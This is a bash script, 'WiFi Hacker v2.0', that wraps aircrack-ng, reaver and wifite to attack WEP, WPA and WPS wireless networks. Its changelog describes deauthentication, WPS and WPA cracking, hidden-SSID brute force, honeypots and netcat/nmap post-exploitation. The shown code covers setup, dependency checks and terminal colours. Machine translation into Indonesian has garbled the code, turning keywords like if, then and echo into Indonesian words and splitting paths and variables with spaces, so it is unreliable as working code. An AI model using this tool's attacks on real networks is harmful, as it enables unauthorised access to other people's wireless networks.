#! / bin / bash


############################################### ##########################
# KREDIT DIMULAI ################################################### ##########
############################################### ##########################


# WiFi Hacker v2.0
# esc0rtd3w 2019

# https://github.com/esc0rtd3w/wifi-hacker/

# Menggunakan bagian dari rangkaian aircrack-ng, reaver, wifite, dan banyak alat lainnya


############################################### ##########################
# KREDIT AKHIR ################################################### ############
############################################### ##########################





############################################### ##########################
# VERSION SEJARAH DIMULAI ################################################# ##
############################################### ##########################

# v2.0
# - Dukungan tambahan untuk opsi terminal Gnome baru. Diuji dalam Kali 2018.4

# v1.9
# - Dukungan tambahan untuk Wash. Saat ini digunakan untuk membuang info pindaian ke teks.
# - Menambahkan "Opsi SSID Bruteforce Tersembunyi" Ke Menu Ekstra dan Fungsi bruteforceHiddenSSID () yang diperbarui.
# - Navigasi Menu yang Diperbarui untuk membatasi memasuki Menu Ekstra sampai setelah adaptor nirkabel telah dipilih.
# - Pembaruan yang dikonfigurasikan dengan pewarnaan baru, dan sekarang hanya akan memperbarui jika versi jauh lebih tinggi dari versi lokal.
# - Membersihkan kode untuk fungsi doSleepMessage (). Sekarang dibutuhkan 3 argumen, "pesan", "waktu", dan "warna".
# - Menu Ekstra Diperbarui. Menambahkan wpa_supplicant, aktifkan dan nonaktifkan opsi. Opsi wpa_cli yang diperbarui.
Sesi simpan Reaver yang diperbarui hanya menyimpan cadangan jika file sesi saat ini ada.
# - Memperbaiki dan memperbarui layar pos keluaran Reaver yang rusak di versi rilis terakhir.

# v1.8
# - Bersihkan skrip dan memindahkan semua pemicu hotkey global ke Function loadMenuHotkeys.
# - Menambahkan bruteforceHiddenSSID () Berfungsi untuk menangani nama SSID yang tersembunyi.
# - Menambahkan logging ke file XML dari airodump-ng saat memindai Poin Akses untuk semua jenis enkripsi.
# - Menambahkan batas waktu 10 detik otomatis untuk Perbarui Menu untuk melanjutkan ke menu utama untuk menyerang.
# - Memperbaiki Menu Pembaruan. "Periksa Pembaruan" dan "Terapkan Pembaruan Baru" sekarang berfungsi.
# - Perbarui Menu sekarang dimuat secara otomatis setelah menerima perjanjian lisensi.
# - Dukungan tambahan untuk mem-parsing nama-nama adaptor jaringan untuk ditampilkan ketika memilih adaptor untuk digunakan.
# - Menambahkan tanda centang untuk serangan PixieWPS. Jika gagal, sekarang akan default ke serangan Reaver normal.

# v1.7
# - Saat ini mendukung hingga 10 adapter wifi.
# - Berubah hotkey untuk "Manual Adapter Entry" dari "M" ke "C", karena bertentangan dengan hotkey menu utama
# - Menambahkan pemeriksaan adaptor setelah penafian disetujui, sehingga menu utama akan menunjukkan jumlah adaptor yang benar.
# - Diperbarui "killCounterMax" untuk menggunakan "interfacesFound" nilai untuk fungsi "stopMonitorMode ()"
# - Menambahkan Fungsi "checkMultipleAdapters"
# - Menambahkan jumlah antarmuka yang ditampilkan pada spanduk statistik.
# - Memperbaiki "Nama Antarmuka" pada spanduk statistik.
# - Diperbarui airodump-ng scripting untuk beberapa fungsi.
# - Memperbaiki matikan PixieDust. Mereka dibalik, nonaktifkan dihidupkan dan sebaliknya.
# - Diperbarui airodump-ng windows untuk hanya memindai jenis enkripsi yang saat ini sedang ditargetkan.

# v1.6
# - Menambahkan fungsi "forceDisconnectWiFi" untuk membantu memperbaiki masalah koneksi internet aktif.
# - Mengubah penanganan "WiFi Force Disconnect". Sekarang, setelah menerima perjanjian, menu utama hanya akan memuat jika status koneksi adalah "0". Jika statusnya "1", artinya WiFi terhubung ke titik akses, fungsi "forceDisconnectWiFi" dan "checkNetworkStatus" dipanggil hingga koneksi dilepaskan. Ini memungkinkan kontrol yang lebih baik untuk mengoreksi kesalahan yang menghasilkan koneksi jaringan yang aktif.
# - Menambahkan output "ifconfig" dan "iwconfig" ke Extras Interface Menu
# - Digabungkan "checkForEmptyBSSID", "checkForEmptyESSID", dan "checkForEmptyChannel" menjadi fungsi "checkForEmptyCredentials".
# - Fungsi "arAttackDeAuthOnRetry" yang dihapus. Ini adalah duplikat dan sekarang menggunakan fungsi "arAttackDeAuth".
# - Membersihkan fungsi "stopMonitorMode".
# - Menambahkan dukungan untuk pelaku intimidasi, yang digunakan untuk serangan WPS.
# - Memperbaiki masalah dengan koneksi jaringan aktif tidak memaksa putuskan sambungan sebelum serangan dimulai.
# - Teks yang diperbarui untuk beberapa menu.
# - Memperbaiki (kebanyakan) masalah dengan file ZIP cadangan menimpa cadangan lama.

# v1.5
# - Kode yang diperbarui untuk menangani pembersihan baru menggunakan opsi cadangan untuk fungsi "backupSessionFiles".
# - Menambahkan teks progres untuk fungsi "cleanCaptureFiles", "cleanSessionFiles", dan backupSessionFiles ".
# - Memperbaiki opsi "Bersihkan File Sesi" dan Bersihkan File "dari Menu Ekstra.
# - Sekarang menyimpan file sesi setelah Serangan Otomatis Wifite untuk mencegah file .cap, .xor, dll dihapus.
# - Diperbarui jumlah IVs minimum hingga 5000 sebelum melakukan crack untuk Wifite WEP Auto Attacks.
# - Memperbaiki argumen otomatis Wifite untuk semua jenis enkripsi.
# - Diperbarui Teks Menu Lain-Lain
# - Menambahkan "aireplay-ng" dan "packetforge-ng" ke pemeriksaan ketergantungan.
# - Menambahkan warna latar belakang terminal dan pemilihan warna teks foreground yang diperbarui.
# - Menambahkan opsi "lebih" yang dapat diketik di bawah Menu Serangan WEP. Menu ini memiliki opsi "TCP Dump", "Generate ARP Packet", "Forge ARP Request", dan "Replay ARP Request".

# v1.4
# - Serangan WPS yang diperbarui untuk menggunakan PixieDust sebagai opsi default setelah batas waktu 10 detik jika tidak ada pilihan yang dibuat.
# - Menambahkan opsi override nama antarmuka manual ke fungsi "getWirelessInterfaces". Atur secara manual ke wlan0, wlan1, wlan2, dll. Ini akan secara otomatis ditampilkan selama eksekusi normal dan Anda dapat mengabaikannya untuk default.
# - Menambahkan bendera "segarkan" yang diatur untuk menyembunyikan teks override pada panggilan berikutnya ke fungsi "getWirelessInterfaces".
# - Menambahkan "bannerSlim" berfungsi untuk menggunakan spanduk "Judul Saja" untuk menu penafian dan yang belum dirilis.
# - Teks yang diperbarui untuk mengumpulkan informasi target pada semua jenis enkripsi yang berbeda.
# - Pesan tidur yang diperbarui untuk serangan WPS.
# - Opsi PixieDust Tetap tidak diatur dengan benar jika tidak ada yang dipilih pada pilihan menu.
# - Teks yang diperbarui untuk semua spanduk. Mengubah teks judul utama dan nama domain.
# - Memperbaiki semua fungsi killProcess sekarang mematikan proses sampai tidak lagi muncul di bawah daftar proses.
# - Menambahkan gaya keluar untuk aircrack-ng sebelum melakukan cracking. Ini mencoba untuk memperbaiki kesalahan yang rusak saat memindai file IVS dan CAP.
# - Memperbaiki jendela Airodump dan Aireplay sebelumnya yang tidak tertutup saat meluncurkan sesi dump baru untuk Menu Serangan WEP.
# - Menambahkan fungsi "findCaptureFiles" untuk mendaftar semua file cap, ivs, csv, netxml yang tersedia untuk diretas.
# - Menambahkan warna terminal ke fungsi "setTerminalColors".
# - Menambahkan fungsi "checkUpdate" dan "getUpdate" untuk mengambil skrip shell terbaru secara langsung.
# - Teks yang diperbarui pada spanduk statistik. Mengubah "Nama Antarmuka:" menjadi "Antarmuka:" untuk memungkinkan nama ESSID yang lebih panjang tanpa membanjiri baris berikutnya.

# v1.3
# - Dukungan tambahan untuk AirCrack Suite v1.2 + menggunakan format wlanXmon baru, bukan monX.
# - Memperbaiki kesalahan "wlanXmon" di Kali Linux 2.x yang disebabkan oleh AirCrack Suite 1.2+ yang baru. Lihat fungsi "fixKaliTwoMonError" untuk info lebih lanjut.
# - Menambahkan fungsi untuk memeriksa versi Linux yang berjalan.
# - Mode Honeypot Dihapus dari spanduk. Ini telah dipindahkan ke Menu Lanjutan.
# - Menambahkan variabel "$ interfaceName" dan "$ interfaceMode".
# - Menambahkan interfaceName ke spanduk statistik. Ini akan menampilkan nama antarmuka saat ini (wlan0, mon0, wlan0mon, dll).
# - Menambahkan interfaceMode ke spanduk utama. Mode Antarmuka Valid adalah 0 = Dikelola / 1 = Standar Monitor / 2 = Monitor Baru / 3 = Monitor Lainnya / 4 = Tidak Dikenal
# - Menambahkan item "Buka Antarmuka Opsi" ke Menu Ekstra.
# - Menambahkan "Interface Up", "Interface Down", "Interface Managed", dan "Interface Monitor" ke Extras Menu. Fungsi Naik dan Turun mempengaruhi antarmuka SAJA untuk mode monitor (mon0, mon1, wlan0mon, wlan1mon, dll) saat ini. Silakan gunakan Aktifkan / Nonaktifkan Channel Hopping untuk menampilkan antarmuka terkelola (mis. Wlan0, wlan1, dll).
# - Menambahkan dukungan untuk semua argumen dan opsi Reaver baru untuk Kali 2.x build.
# - Menambahkan opsi pemindaian WPS airodump-ng untuk sekarang memperlihatkan koneksi WPS tanpa menggunakan wifite untuk memperlihatkannya.
# - Menghapus jendela wifite agar tidak diluncurkan dengan serangan WPS standar. Digantikan oleh flag --wps di airodump-ng.
# - Menambahkan fungsi "fixAirmonCompat" untuk mengirim perintah untuk membunuh semua proses yang dapat mengganggu.
# - Menghapus fungsi "initAirmon" yang tidak aktif.
# - Menambahkan perbaikan proses konflik udara ke Menu Ekstra.
# - Menambahkan antarmuka "wlanXmon" untuk penghentian mode monitor. Cara yang lebih baik untuk melakukan ini akan segera dilakukan!
# - Tetap tidak kembali ke Menu Ekstra dari "Open Interfaces Menu".
# - Menambahkan variabel "isDebugMode" untuk menampilkan / menyembunyikan area tertentu yang mungkin memerlukan output pengujian tambahan. Dinonaktifkan secara default.
# - Memperbaiki saluran pemindaian dumping WEP standar yang melompat selama serangan.

# v1.2
# - Memperbaiki teks bagian atas banner penafian agar tidak terpotong.

# v1.1
# - Sekarang secara global memberlakukan pemutusan dari jaringan yang aktif atas persetujuan penafian untuk menyelesaikan masalah "Channel Hopping". Ini harus dilakukan agar semua serangan berfungsi dengan baik.
# - Menambahkan "Mode HoneyPot" ke bilah alat utama. Tombol pintas adalah "Z" untuk diluncurkan dari mana saja dalam skrip. Saat ini ada dukungan untuk pangkalan udara dan wifi-madu.
# - Memperbaiki "Negatif Satu Saluran Kesalahan" yang terjadi di airodump-ng di Kali Linux 1.0.6 dan lebih tinggi. Ini diperbaiki secara global dan harus bekerja pada semua platform.
# - Menambahkan "Start NetworkManager", "Stop NetworkManager", "Stop wpa_supplicant", "Stop wpa_cli", "Aktifkan Channel Hopping", dan "Nonaktifkan Channel Hopping" ke menu Extras.
# - Mengaktifkan Menu Lanjutan. Juga mengaktifkan hotkey "A" untuk meluncurkannya. Rilis di masa depan akan berisi pengaturan yang sangat dapat dikonfigurasi untuk aplikasi dan modul yang didukung.
# - Menambahkan dukungan untuk nmap dan netcat, untuk digunakan selama eksploitasi pasca.
# - Memperbaiki beberapa kesalahan variabel $ bssid dan $ essid dalam serangan WEP. 
# - Memperbaiki jendela airodump tidak menutup jika menggunakan hotkey sesi pemuatan selama info korban, dan kemudian kembali ke menu mode post monitor.
# - Memperbaiki bug di mana layar mode pos monitor masih akan memuat jika tidak ada tipe enkripsi yang dipilih. Jika jenis enkripsi kosong, sekarang akan kembali ke menu utama.
# - Petunjuk pada layar yang diperbarui untuk menggunakan jendela airdump dan jendela terminal lainnya yang dibuka selama pengaturan target / korban.
# - Koneksi jaringan tetap tidak menyegarkan status yang benar ketika kembali ke menu utama jika status jaringan telah berubah saat masih di menu.
# - Menambahkan cek kedua untuk memverifikasi bahwa tidak ada koneksi jaringan yang aktif sebelum meluncurkan serangan.
# - Memindahkan teks autoMode ke bagian atas layar inisiasi mode monitor pos agar lebih mudah dilihat oleh pengguna.
# - Menambahkan dukungan untuk serangan pasca-eksploitasi setelah target dikompromikan.
# - Menambahkan dukungan untuk "wifite". Ini digunakan untuk beberapa mode serangan otomatis yang lebih baru serta opsi alternatif untuk aircrack-suite jika diinginkan.
# - Menambahkan Mode Serangan Otomatis ke menu utama. Opsi ini menggunakan wifite untuk memindai dan menyerang jaringan yang rentan.
# - Mengubah beberapa teks pada beberapa item menjadi lebih jelas dan mudah dimengerti.
# - Menambahkan mode Otomatis untuk setiap jenis serangan saat dipilih. Setelah jenis enkripsi dipilih, Anda dapat mengetik masing-masing "autowep, autowps, autowpa, dan autowpa2 untuk mengotomatiskan serangan.
# - Memperbaiki beberapa variabel $ lastMenuID yang tidak diatur dengan benar untuk navigasi menu.
# - Menambahkan jendela wifite di samping jendela aircrack ketika memilih serangan WPS, untuk membantu menguraikan target mana yang mendukung WPS dengan lebih mudah.

# v1.0
# - Mengaktifkan penafian saat meluncurkan skrip untuk memastikan semua orang tahu aturannya;)
# - Menambahkan "checkRootStatus" untuk memverifikasi hak yang lebih tinggi sebelum meluncurkan menu utama.
# - Memperbaiki beberapa kesalahan ketik di seluruh skrip.
# - Menambahkan tampilan Koneksi ke menu utama. Status "0" terputus dan "1" terhubung.
# - Menambahkan pemeriksaan status koneksi sebelum mengizinkan mode serangan untuk dipilih. Ini mencegah mencoba memulai serangan dan dikunci ke saluran dan kelainan lainnya.
# - Menambahkan variabel tampilan teks untuk status koneksi. Mereka dapat ditampilkan sebagai "Tidak Ada" atau "Wifi", tergantung pada apakah status koneksi adalah 0 atau 1.

# v0.9
# - Menghapus fungsi writeDCrackPy (). Ini digunakan untuk menulis skrip Python dcrack.py ke file.

# v0.8
# - Dukungan tambahan untuk besside-ng. Digunakan untuk memecahkan kata sandi WPA / WPA2, dan mengunggah ke cloud cracking,
# - Memperbaiki jendela aircrack agar tidak menutup setelah menjalankan serangan kamus.
# - Menambahkan checkDependencies () berfungsi untuk memeriksa semua file yang diperlukan sebelum memuat menu utama.
# - Memperbaiki Bilah Navigasi agar tidak muncul di menu Bantuan.
# - Memperbaiki jendela aircrack agar tidak menutup saat memulai kembali serangan WPA / WPA2.
# - Memperbaiki Bantuan dan menu Lanjutan tidak kembali ke halaman terakhir ketika mencoba untuk kembali.

# v0.7
# - Memperbaiki kesalahan aircrack WEP dengan nama ESSID yang memiliki spasi di dalamnya.
# - Opsi Terminal Tetap tidak kembali ke menu sebelumnya dengan benar.
# - Membersihkan beberapa kode lama yang tidak lagi digunakan atau direferensikan.
# - Memperbaiki file reaver WPC yang tidak disalin dengan benar.
# - Sekarang menyalin semua file WPC selama startup reaver, dan menimpa file WPC saat ini setelah sesi reaver berakhir.

# v0.6
# - Menambahkan stempel waktu dan tanggal ke semua file log $ enkripsiType.sessions.
# - Opsi "Bersihkan File Tangkapan" sekarang hanya menghapus file dalam direktori init, bukan direktori sesi.
# - Fixed bug tidak kembali ke menu Extras setelah tugas yang dipilih selesai.
# - Semua file yang dibuat sekarang akan disimpan ke direktori "/ session / $ enkripsiType" secara default.
# - Menambahkan getCurrentDate () dan getCurrentTime () berfungsi untuk digunakan dengan sesi dan cadangan.
# - Menambahkan opsi Cadangan ke menu Ekstra. Ini menciptakan file zip dengan semua sesi yang disimpan dan mengambil file.
# - Menambahkan file "* .kismit.csv" dan "* .kismit.netxml" ke menu "Cleanup Capture Files" di bawah Extras.
# - Mengubah semua referensi dari $ currentTask menjadi $ lastMenuID karena masalah navigasi menu.
# - Menambahkan variabel baru yang disebut $ lastMenuID untuk (semoga) navigasi antar menu.
# - Kode pindah untuk memeriksa MAC Spoof Status menjadi fungsi checkSpoofStatus (). Sekarang dapat digunakan secara global.
# - Memperbaiki kesalahan ketik pada fungsi Load Session.
# - Sesi yang diperbarui menyimpan folder dan diatur berdasarkan jenis enkripsi.
# - Menambahkan sesi save reaver file WPC ke folder sesi default.

# v0.5
# - Memperbaiki serangan WEP. Itu tidak diarahkan dengan benar setelah pembaruan v0.4 terakhir.
# - Semua mode serangan diuji ulang dan tampaknya berfungsi dengan baik.
# - Menambahkan tanda centang untuk jenis enkripsi kosong untuk mencegah melakukan tugas tertentu jika belum ada jenis yang dipilih.
# - Diperbarui Simpan dan Muat menu sesi. Itu tidak berfungsi dengan baik dari beberapa menu. Masih dalam pengujian.

# v0.4
# - Memindahkan semua fungsi dan variabel inisialisasi ke initMain (). Ini hanya untuk "kebersihan kode".
# - Diperbarui aircrack dan pengalihan airodump berdasarkan jenis serangan enkripsi.
# - Menambahkan "Bersihkan File Sesi" ke menu Ekstra. Hati-hati dengan ini dan pastikan untuk menyimpan cadangan.
# - Tetap tidak bisa kembali ke menu serangan dari sesi Simpan dan Muat untuk serangan WEP.
# - Menambahkan variabel $ currentTask untuk berubah secara dinamis tergantung pada fungsi apa yang sedang dijalankan.
# - Pindah jendela udara untuk serangan WPA dan WPA2 ke jendela terminal eksternal.
# - Memperbaiki tidak bisa meninggalkan jendela aircrack saat menjalankan serangan WPA dan WPA2.

# v0.3
# - Diperbarui mode serangan WPA dan WPA2. Keduanya berfungsi penuh dan dapat memuat daftar kata kustom.
# - Menambahkan kemampuan untuk mengubah terminal di bawah menu Extras. Mendukung Gnome, Konsole, Xterm, dan Custom.
# - Memperbaiki file sesi kosong yang sedang ditulis ketika belum ada tipe enkripsi yang dipilih.
# - Menambahkan penafian yang harus diterima sebelum meluncurkan menu utama (saat ini dinonaktifkan).
# - Memperbaiki WPA dan WPA2 agar tidak menulis nilai yang benar ke file log "$ capturePath / $ enkripsiType / $ enkripsiType.sessions".
# - Memperbaiki bug di WPA / WPA2 yang mencegah kembali ke menu utama atau keluar dari halaman daftar kata.
# - Diperbarui beberapa teks di layar ketika stasiun deauth berjalan untuk WEP, WPA, dan WPA2.
# - Mode Auto dihapus dari spanduk atas, yang sekarang default setelah memilih jenis enkripsi.

# v0.2
# - Memperbaiki serangan WEP dan WPS (reaver). Keduanya sepenuhnya berfungsi sekarang!
# - Setiap jenis serangan menulis ke file lognya sendiri sekarang ("$ capturePath / $ enkripsiType / $ enkripsiType.sessions").
# - Membersihkan beberapa kode lama yang dimigrasikan dari skrip sebelumnya.

# v0.1
# - Versi awal. Menggabungkan skrip wifi saat ini menjadi satu.


############################################### ##########################
# VERSION HISTORY END ################################################## ####
############################################### ##########################





############################################### ##########################
# YANG HARUS DILAKUKAN DAFTAR MULAI ########################################### #########
############################################### ##########################


# Perpanjang lebar jendela airodump saat membuka secara eksternal
# Tambahkan opsi perubahan on-the-fly untuk WPS dan mode serangan lainnya
# Tambahkan dukungan cowpatty untuk serangan WPA / WPA2
# Setel variabel temp "ok sejauh" untuk melihat apakah semua dependensi tersedia
# Set default $ serverWPA dapat diverifikasi untuk beberapa nilai selain dari kosong
# Tambahkan dukungan sniffing / wireshark
# Tambahkan dukungan untuk pangkalan udara
# Buat file handshake terpisah dengan nama file yang sesuai
# Tambahkan "buat daftar kata" untuk nomor telepon dan mungkin yang lain. Tambahkan opsi untuk lokal
# Tambahkan cek dan salin file yang dibuat oleh besside ke direktori yang sesuai
# Tambahkan konversi ke .hccap dukungan untuk ocl-hashcat dan perangkat lunak lain yang kompatibel
# Dapatkan mode lanjutan berfungsi
# Dapatkan menu bantuan berfungsi


# Serangan Pasca Eksploitasi Untuk Menambahkan (Mungkin Memo 20160514)

# driftnet
# nmap
# wifi-sayang


############################################### ##########################
# UNTUK MELAKUKAN DAFTAR AKHIR ########################################### ###########
############################################### ##########################





############################################### ##########################
# PILIHAN INISIIALISASI DIMULAI #######################################
############################################### ##########################


initMain () {

	#checkArgs

	checkLinuxVersion

	Bunuh semua
	#startNetworkManager

	getCurrentDate
	getCurrentTime
	getCurrentDateAndTime

	setDependencies
	checkDependencies

	ubah ukuran jendela

	setVariablesRequired
	setVariablesOptional
	setVariablesAdvanced

	setDefaults
	setDefaultsWEP
	setDefaultsWPA
	setDefaultsWPA2
	setDefaultsWPS

	setDefaultSession

	setTerminalColors

	# Secara opsional tampilkan dependensi sebelum diluncurkan
	#showDependencies

	# Opsional Tampilkan Penafian Sebelum Peluncuran
	showDisclaimer

	# Secara opsional Tampilkan Teks yang Tidak Dirilis Sebelum Peluncuran
	#dibebaskan

	# Muat Menu Utama
	menu utama

}

checkArgs () {

	huruf "$ #" di
	
	"1")
	jika [-e $ 1];
		kemudian
			echo "File $ 1 Ada"
		lain
			echo "File $ 1 Tidak Ada"
	fi
	;;
	
	esac
}

checkLinuxVersion () {

	# Atur kedua nilai Kali default ke ON dan jika kosong, Kali tidak ada
	isKali = 1
	isKaliTwo = 1

	# Dapatkan Linux Build Info
	linuxVersion = $ (lsb_release -a | grep Keterangan | cut -f2 -d ":")

	# Periksa versi Linux untuk mengetahui keberadaan Kali
	kali = $ (echo "$ linuxVersion" | grep Kali)

	# Periksa versi Linux untuk mengetahui keberadaan Kali 2.x
	kaliTwo = $ (echo "$ linuxVersion" | grep Kali | grep 2.)

	# Periksa Kali Linux
	huruf "$ kali" di

		"")
		isKali = 0
		;;
	esac

	# Periksa Kali Linux 2.x
	# Menggunakan Aircrack-ng v1.2 RC2 + (Mode Monitor Berbeda)
	huruf "$ kaliTwo" di

		"")
		isKaliTwo = 0
		;;
	esac

	#echo "Versi Linux: $ linuxVersion"
	#echo ""
	#echo "Is Kali ?: $ isKali"
	#echo ""
	#echo "Is Kali 2.x ?: $ isKaliTwo"
	#baca jeda
}


############################################### ##########################
# OPSI INISIIALISASI AKHIR #########################################
############################################### ##########################





############################################### ##########################
# PILIHAN DEPENDENSI DIMULAI ################################################
############################################### ##########################


setDependencies () {

	pathAircrack = "/ usr / bin / aircrack-ng"
	pathAireplay = "/ usr / sbin / aireplay-ng"
	pathAirodump = "/ usr / sbin / airodump-ng"
	pathBesside = "/ usr / sbin / besside-ng"
	pathCut = "/ usr / bin / cut"
	pathDate = "/ bin / date"
	pathGrep = "/ bin / grep"
	pathHead = "/ usr / bin / head"
	pathLink = "/ usr / bin / tautan"
	pathMacchanger = "/ usr / bin / macchanger"
	pathMkdir = "/ bin / mkdir"
	pathPacketforge = "/ usr / sbin / packetforge-ng"
	pathReaver = "/ usr / bin / reaver"
	pathRmdir = "/ bin / rmdir"
	pathSed = "/ bin / sed"
	pathSleep = "/ bin / sleep"
	pathTail = "/ usr / bin / tail"
	pathWash = "/ usr / bin / wash"
	pathWget = "/ usr / bin / wget"

}


checkDependencies () {

	# tempCounter = 0
	# numberOfDependencies = 0
	
	# tempPath = ""
	# tempStatus = ""

	# Jika penghitung kurang dari dependensi maks, maka buat status
	#jika [$ tempCounter -lt $ numberOfDependencies];
	# kemudian
	# # Tetapkan Nama Jalur
	# if [-f $ tempPath];
	# kemudian
	# # Atur Status Sebagai Tersedia
	# $ tempStatus = "OK"
	# lain
	# # Atur Status Sebagai Tidak Tersedia
	# $ tempStatus = "NA"
	# fi
	# lain
	# #echo "Selesai Dengan Ketergantungan"
	# #baca jeda
	#fi
	
	if [-f $ pathAircrack];
		kemudian
		   statusPathAircrack = "OK"
		lain
		   statusPathAircrack = "NA"
	fi

	if [-f $ pathAirodump];
		kemudian
		   statusPathAirodump = "OK"
		lain
		   statusPathAirodump = "NA"
	fi

	if [-f $ pathAireplay];
		kemudian
		   statusPathAireplay = "OK"
		lain
		   statusPathAireplay = "NA"
	fi

	if [-f $ pathBesside];
		kemudian
		   statusPathBesside = "OK"
		lain
		   statusPathBesside = "NA"
	fi

	if [-f $ pathCut];
		kemudian
		   statusPathCut = "OK"
		lain
		   statusPathCut = "NA"
	fi

	if [-f $ pathDate];
		kemudian
		   statusPathDate = "OK"
		lain
		   statusPathDate = "NA"
	fi

	if [-f $ pathGrep];
		kemudian
		   statusPathGrep = "OK"
		lain
		   statusPathGrep = "NA"
	fi

	if [-f $ pathHead];
		kemudian
		   statusPathHead = "OK"
		lain
		   statusPathHead = "NA"
	fi

	jika [-f $ pathLink];
		kemudian
		   statusPathLink = "OK"
		lain
		   statusPathLink = "NA"
	fi

	if [-f $ pathMacchanger];
		kemudian
		   statusPathMacchanger = "OK"
		lain
		   statusPathMacchanger = "NA"
	fi

	if [-f $ pathMkdir];
		kemudian
		   statusPathMkdir = "OK"
		lain
		   statusPathMkdir = "NA"
	fi

	if [-f $ pathPacketforge];
		kemudian
		   statusPathPacketforge = "OK"
		lain
		   statusPathPacketforge = "NA"
	fi

	if [-f $ pathReaver];
		kemudian
		   statusPathReaver = "OK"
		lain
		   statusPathReaver = "NA"
	fi

	if [-f $ pathRmdir];
		kemudian
		   statusPathRmdir = "OK"
		lain
		   statusPathRmdir = "NA"
	fi

	if [-f $ pathSed];
		kemudian
		   statusPathSed = "OK"
		lain
		   statusPathSed = "NA"
	fi

	if [-f $ pathSleep];
		kemudian
		   statusPathSleep = "OK"
		lain
		   statusPathSleep = "NA"
	fi

	if [-f $ pathTail];
		kemudian
		   statusPathTail = "OK"
		lain
		   statusPathTail = "NA"
	fi

	if [-f $ pathWash];
		kemudian
		   statusPathWash = "OK"
		lain
		   statusPathWash = "NA"
	fi

	if [-f $ pathWget];
		kemudian
		   statusPathWget = "OK"
		lain
		   statusPathWget = "NA"
	fi

}


downloadDependencies () {

	blank = ""

}


showDependencies () {

	spanduk
	bannerStats

	gema ""
	echo "Daftar Ketergantungan File Diperlukan"
	gema ""
	echo "$ pathAircrack - Status: $ statusPathAircrack"
	echo "$ pathAireplay - Status: $ statusPathAireplay"
	echo "$ pathAirodump - Status: $ statusPathAirodump"
	echo "$ pathBesside - Status: $ statusPathBesside"
	echo "$ pathCut - Status: $ statusPathCut"
	echo "$ pathDate - Status: $ statusPathDate"
	echo "$ pathGrep - Status: $ statusPathGrep"
	echo "$ pathHead - Status: $ statusPathHead"
	echo "$ pathLink - Status: $ statusPathLink"
	echo "$ pathMacchanger - Status: $ statusPathMacchanger"
	echo "$ pathMkdir - Status: $ statusPathMkdir"
	echo "$ pathPacketforge - Status: $ statusPathPacketforge"
	echo "$ pathReaver - Status: $ statusPathReaver"
	echo "$ pathRmdir - Status: $ statusPathRmdir"
	echo "$ pathSed - Status: $ statusPathSed"
	echo "$ pathSleep - Status: $ statusPathSleep"
	echo "$ pathTail - Status: $ statusPathTail"
	echo "$ pathWash - Status: $ statusPathWash"
	echo "$ pathWget - Status: $ statusPathWget"
	gema ""
	gema ""

	echo "Tekan ENTER untuk melanjutkan ...."

	baca jeda

}


############################################### ##########################
# PILIHAN DEPENDENSI AKHIR ################################################## #
############################################### ##########################





############################################### ##########################
# PILIHAN TERMINAL DIMULAI ################################################# #
############################################### ##########################


setWindowTitle () {

	currentTask = "setWindowTitle"

	title = 'echo -ne "\ 033] 0; Peretas WiFi v2.0 \ 007"'

	$ title

}


resizeWindow () {

	currentTask = "resizeWindow"

	printf '\ 033 [8; 32; 115t'

}


setTerminalColors () {

	currentTask = "setTerminalColors"

	# Warna Foreground
	defaultFG = $ (echo 'printf' '\ 033 [39m')
	
	black = $ (echo 'printf' '\ 033 [30m')
	blue = $ (echo 'printf' '\ 033 [34m')
	cyan = $ (echo 'printf' '\ 033 [36m')
	darkGrey = $ (echo 'printf' '\ 033 [90m')
	hijau = $ (echo 'printf' '\ 033 [32m')
	lightBlue = $ (echo 'printf' '\ 033 [94m')
	lightCyan = $ (echo 'printf' '\ 033 [96m')
	lightGreen = $ (echo 'printf' '\ 033 [92m')
	lightGrey = $ (echo 'printf' '\ 033 [37m')
	lightMagenta = $ (echo 'printf' '\ 033 [95m')
	lightRed = $ (echo 'printf' '\ 033 [91m')
	lightYellow = $ (echo 'printf' '\ 033 [93m')
	magenta = $ (echo 'printf' '\ 033 [35m')
	red = $ (echo 'printf' '\ 033 [31m')
	white = $ (echo 'printf' '\ 033 [0m')
	whiteAlt = $ (echo 'printf' '\ 033 [97m')
	yellow = $ (echo 'printf' '\ 033 [33m')
	
	# Warna Latar Belakang
	defaultBG = $ (echo 'printf' '\ 033 [49m')
	
	blackBG = $ (echo 'printf' '\ 033 [40m')
	blueBG = $ (echo 'printf' '\ 033 [44m')
	cyanBG = $ (echo 'printf' '\ 033 [46m')
	darkGreyBG = $ (echo 'printf' '\ 033 [100m')
	greenBG = $ (echo 'printf' '\ 033 [42m')
	lightBlueBG = $ (echo 'printf' '\ 033 [104m')
	lightCyanBG = $ (echo 'printf' '\ 033 [106m')
	lightGreenBG = $ (echo 'printf' '\ 033 [102m')
	lightGreyBG = $ (echo 'printf' '\ 033 [47m')
	lightMagentaBG = $ (echo 'printf' '\ 033 [105m')
	lightRedBG = $ (echo 'printf' '\ 033 [101m')
	lightYellowBG = $ (echo 'printf' '\ 033 [103m')
	magentaBG = $ (echo 'printf' '\ 033 [45m')
	redBG = $ (echo 'printf' '\ 033 [41m')
	whiteBG = $ (echo 'printf' '\ 033 [107m')
	yellowBG = $ (echo 'printf' '\ 033 [43m')

}


setTerminalTextEffects () {

	currentTask = "setTerminalTextEffects"

	textBlink = $ (echo -e "\ e [5m")
	textBold = $ (echo -e "\ e [1m")
	textDim = $ (echo -e "\ e [2m")
	textHidden = $ (echo -e "\ e [8m")
	textInverted = $ (echo -e "\ e [7m")
	textUnderline = $ (echo -e "\ e [4m")

}


############################################### ##########################
# PILIHAN TERMINAL AKHIR ################################################## ###
############################################### ##########################





############################################### ##########################
# VARIABEL DEFAULT DIMULAI ##################################################
############################################### ##########################


setVariablesRequired () {

	currentTask = "setVariablesRequired"

	versionBase = "2.0"
	versionBaseClean = "00"

	initPath = "$ PWD"

	isDebugMode = "0"
	isDevBuild = "0"

	# Perbarui Barang
	versionRemote = "0,0"
	versionRemoteClean = "00"
	versionRemoteTemp = "0,0"
	newUpdateAvailable = "0"
	updateMaster = https: //raw.githubusercontent.com/esc0rtd3w/wifi-hacker/master/wifi-hacker.sh
	updateTemp = "/ tmp / update-check.tmp"
	updateChecked = "0"
	skipUpdate = "0"
	returnToUpdatePage = "0"

	# Menetapkan nilai default pembaruan skrip yang diunduh
	newVersionScript = "0.0"
	
	# Periksa versi Gnome untuk opsi terminal (ditambahkan 20190205)
	gnomeVer = $ (gnome-terminal --version | grep "3.")

	huruf "$ gnomeVer" di
	
		# Kali 2018.4 Terminal GNOME 3.30.0 menggunakan VTE 0.54.1 + GNUTLS
		"")
		gnomeOptions = "legacy"
		terminal = "gnome-terminal -x"
		terminalGnome = "gnome-terminal -x"
